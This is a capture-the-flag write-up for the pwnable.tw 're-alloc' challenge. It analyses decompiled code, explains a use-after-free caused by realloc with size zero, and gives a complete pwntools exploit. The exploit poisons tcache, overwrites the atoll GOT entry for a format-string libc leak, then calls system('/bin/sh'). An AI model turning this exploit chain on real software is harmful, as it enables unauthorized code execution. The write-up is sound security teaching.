# Challenge Description
## File type
```bash
$ file re-alloc
re-alloc: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.29.so, BuildID[sha1]=14ee078dfdcc34a92545f829c718d7acb853945b, for GNU/Linux 3.2.0, not stripped
```

## Binary Protection
```bash
$ checksec re-alloc
[*] './re-alloc'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    FORTIFY:    Enabled
    Stripped:   No
```

## Background
- `re-alloc` file offers 4 options to interact with memory:
	- Option 1: Allocate a new memory
	- Option 2: Reallocate an old memory
	- Option 3: Free a memory
	- Option 4: Quit the program
```bash
$ ./re-alloc
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊      RE Allocator      🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. Alloc               $
$   2. Realloc             $
$   3. Free                $
$   4. Exit                $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: 1
Index:0
Size:12
Data:abc
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊      RE Allocator      🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. Alloc               $
$   2. Realloc             $
$   3. Free                $
$   4. Exit                $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: 2
Index:0
Size:40
Data:def
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊      RE Allocator      🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. Alloc               $
$   2. Realloc             $
$   3. Free                $
$   4. Exit                $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: 3
Index:0
```

- The program stores the returned memory address into a global array of pointer (`heap` var) whose length is 2. First 3 options is provided through 3 separated functions:
	- Option 1: `allocate()` function takes and validates the index and size from user, then allocates a memory chunk on heap and store in global `heap` variable.
	```c
	int allocate()
	{
		_BYTE *v0; // rax
		unsigned __int64 index; // [rsp+0h] [rbp-20h]
		unsigned __int64 size; // [rsp+8h] [rbp-18h]
		void *ptr; // [rsp+18h] [rbp-8h]

		printf("Index:");
		index = read_long();
		if ( index > 1 || heap[index] )
		{
			LODWORD(v0) = puts("Invalid !");
		}
		else
		{
			printf("Size:");
			size = read_long();
			if ( size <= 120 )
			{
				ptr = realloc(0LL, size);                 // malloc(size);
				if ( ptr )
				{
					heap[index] = ptr;
					printf("Data:");
					v0 = (_BYTE *)(heap[index] + read_input(heap[index], (unsigned int)size));
					*v0 = 0;
				}
				else
				{
					LODWORD(v0) = puts("alloc error");
				}
			}
			else
			{
				LODWORD(v0) = puts("Too large!");
			}
		}
		return (int)v0;
	}
	```

	- Option 2: `reallocate()` function receives index, size of new chunk from user and reallocates a memory chunk.
	```c
	int reallocate()
	{
		unsigned __int64 index; // [rsp+8h] [rbp-18h]
		unsigned __int64 size; // [rsp+10h] [rbp-10h]
		void *newPtr; // [rsp+18h] [rbp-8h]

		printf("Index:");
		index = read_long();
		if ( index > 1 || !heap[index] )
			return puts("Invalid !");
		printf("Size:");
		size = read_long();
		if ( size > 120 )
			return puts("Too large!");
		newPtr = realloc((void *)heap[index], size);
		if ( !newPtr )
			return puts("alloc error");
		heap[index] = newPtr;
		printf("Data:");
		return read_input(heap[index], size);
	}
	```

	- Option 3: `rfree()` function free a allocated memory chunk and set the corresponding index entry of the `heap` variable to null pointer.
	```c
	int rfree()
	{
		_QWORD *v0; // rax
		unsigned __int64 v2; // [rsp+8h] [rbp-8h]

		printf("Index:");
		v2 = read_long();
		if ( v2 > 1 )
		{
			LODWORD(v0) = puts("Invalid !");
		}
		else
		{
			realloc((void *)heap[v2], 0LL);
			v0 = heap;
			heap[v2] = 0LL;
		}
		return (int)v0;
	}
	```
- The special thing is those 3 operations both repurpose the `realloc` function:
	- `realloc(NULL, size)`: same as `malloc(size)`.
	- `realloc(ptr, size)`: normal usage of `realloc`. If the size value is the same as old chunk size, then it does nothing and returns the same address as before.
	- `realloc(ptr, NULL)`: same as `free(ptr)`.
- Constraints:
	- We cannot allocate a chunk whose size is more than 120 bytes.
	- Reading user input function always checks the buffer size to prevent buffer overflow.

# Vulnerability
- The vulnerability is in reallocate function. It doesn't handle case that the size value is 0. If we do reallocating operation with the size is 0, the function will run `realloc(ptr, 0)` which is equivalent to `free(ptr)`. Because the index in array storing the pointer to that memory after that isn't set to null, it leads to **use-after-free** vulnerability.

# Exploitation
## Arbitrary Write
- The libc provided in this challenge has mitigation that prevent double-free vulnerability so we cannnot make tcache poisoning attack.
- However, this mitigation only check if an address exists in a bin of tcache corresponding to its chunk size. Therefore, we can bypass double-free check by resize the chunk and free it again.
- We use this attack to put an arbitrary address we want to tcache. In next `malloc` usage will return that address and we have privilege to write any data to that address. Below is the sample code for that idea:
```python
# Pollutes 0x20 bin with TARGET_ADDRESS
allocate(0, 0x10, b"abc")
reallocate(0, 0)  # free pointer in index 0
rellocate(0, 0x10, TARGET_ADDRESS)
allocate(1, 0x10, b"abc")

# Set pointer in index 0 to null
reallocate(0, 0x50, b"abc")
rfree(0)

# Set pointer in index 1 to null
rellocate(1, 0x60, b"abc")
rfree(1)

# The same code with 0x30 bin...
```

- After running the above code, tcache should look like:
```bash
pwndbg> tcachebins
tcachebins
0x20 [  0]: (TARGET_ADDRESS) ◂— ...
0x30 [  0]: (TARGET_ADDRESS) ◂— ...
```

## Leak Libc
- Since we have arbitrary write and PIE is disabled, I think of overwriting the GOT table. In this case, I would like to overwrite `atoll` function to `printf` so that we can leak data from stack using format string attack.
```python
printf_plt = exe.plt['printf']
allocate(0, 0x20, p64(printf_plt))
```

- With the above, we leaked the data from stack and get libc address.

## Get Shell
- Now we have libc base address, so we can calculate the address of `system` function and again overwrite `atoll` function to `system` function.
- However, `atoll` now became `printf` which returns the number of output character. Therefore, we should change to a more appropriate way.

## Exploit Code
```python
from pwn import *
import utils

context.terminal = "kitty"
context.log_level = "debug"
context.arch = "amd64"

TARGET = "./bin/re-alloc"

target = process(TARGET)
# target = remote("chall.pwnable.tw", 10106)
gdb.attach(target, gdbscript="b *(main + 40)")

exe = ELF(TARGET)
libc = exe.libc
rop = ROP(exe)

def allocate(index: int, size: int, data: bytes):
	target.sendlineafter(b"Your choice:", b"1")
	target.sendafter(b"Index:", str(index).encode()) 
	target.sendafter(b"Size:", str(size).encode())
	target.sendafter(b"Data:", data)

def reallocate(index: int, size: int, data: bytes = b""):
	target.sendlineafter(b"Your choice: ", b"2")
	target.sendafter(b"Index:", str(index).encode()) 
	target.sendafter(b"Size:", str(size).encode())
	if size > 0:
		target.sendafter(b"Data:", data)

def rfree(index: int):
	target.sendlineafter(b"Your choice: ", b"3")
	target.sendafter(b"Index:", str(index).encode())

def printf(data: bytes):
	target.sendlineafter(b"Your choice: ", b"3")
	target.sendafter(b"Index:", data)

def new_allocate(index: bytes, size: bytes, data: bytes):
	target.sendlineafter(b"Your choice: ", b"1")
	target.sendafter(b"Index:", index)
	target.sendafter(b"Size:", size)
	target.sendafter(b"Data:", data)

allocate(0, 0x10, b"abc")
reallocate(0, 0)
atoll_got = exe.got['atoll']
reallocate(0, 0x10, p64(atoll_got))
allocate(1, 0x10, b"abc")
reallocate(0, 0x50, b"abc")
rfree(0)
reallocate(1, 0x60, b"abc")
rfree(1)

allocate(0, 0x20, b"abc")
reallocate(0, 0)
atoll_got = exe.got['atoll']
reallocate(0, 0x20, p64(atoll_got))
allocate(1, 0x20, b"abc")
reallocate(0, 0x50, b"abc")
rfree(0)
reallocate(1, 0x60, b"abc")
rfree(1)

printf_plt = exe.plt['printf']
allocate(0, 0x20, p64(printf_plt))
printf(b"%3$p")
__read_chk_addr = int(target.recvuntil(b"Invalid !", drop=True).decode(), 16)
libc.address = __read_chk_addr - 9 - libc.symbols['__read_chk']
system_addr = libc.symbols['system']

new_allocate(b"A" * 1, b"B" * 10, p64(system_addr))
printf(b"/bin/sh")

target.interactive()
```
